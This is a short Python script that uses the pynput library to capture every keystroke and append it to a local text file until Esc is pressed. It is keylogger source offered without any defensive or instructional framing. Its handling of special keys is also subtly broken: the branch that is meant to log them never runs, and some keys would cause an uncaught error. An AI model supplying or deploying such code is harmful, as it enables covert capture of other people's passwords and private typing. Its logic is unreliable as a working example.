from pynput import keyboard

# File path to store the keystrokes
output_file = "keystrokes.txt"

def on_press(key):
    try:
        # Check if the pressed key has a 'char' attribute (regular keys)
        if hasattr(key, 'char'):
            with open(output_file, "a") as file:
                file.write(key.char)
    except AttributeError:
        # Some special keys (e.g., function keys, arrows) don't have a 'char' attribute
        with open(output_file, "a") as file:
            file.write(f"Special key: {key}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Create and start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
